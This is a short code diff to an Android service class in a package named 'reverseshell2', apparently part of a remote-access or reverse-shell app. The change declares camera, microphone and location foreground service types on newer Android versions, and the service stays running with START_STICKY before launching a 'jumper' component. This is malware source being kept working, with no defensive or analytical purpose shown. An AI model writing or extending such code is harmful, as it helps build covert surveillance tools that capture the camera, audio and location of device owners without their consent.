@@ -2,6 +2,8 @@ package com.example.reverseshell2;
 
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
+import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 
@@ -30,7 +32,11 @@ public class mainService extends Service {
                 .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW);
         
         // Start service in foreground
-        startForeground(1122, builder.build());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(1122, builder.build(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        } else {
+            startForeground(1122, builder.build());
+        }
         
         new jumper(getApplicationContext()).init();
         return START_STICKY;
